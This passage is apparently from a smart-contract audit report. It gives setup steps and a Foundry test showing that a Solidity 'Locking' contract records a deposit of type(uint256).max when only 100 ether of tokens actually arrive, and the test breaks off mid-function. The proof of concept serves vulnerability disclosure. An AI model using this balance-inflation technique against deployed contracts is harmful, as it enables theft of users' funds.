specialDepositContract = new Locking(address(specialToken));
specialToken.transfer(user, 100 ether);
```

4. Add this test function to the LockingTest contract:

```solidity
function testVulnerableDeposit() public {
    vm.startPrank(user);

    // Approve a large amount
    specialToken.approve(address(specialDepositContract), type(uint256).max);

    // User only has 100 ether of tokens, but tries to deposit type(uint256).max
    specialDepositContract.deposit(type(uint256).max);

    vm.stopPrank();

    // Check the recorded deposit amount (should be type(uint256).max)
    assertEq(specialDepositContract.getBalance(user), type(uint256).max);

    // Check the actual token balance of the contract (should be 100 ether)
    assertEq(specialToken.balanceOf(address(specialDepositContract)), 100 ether);

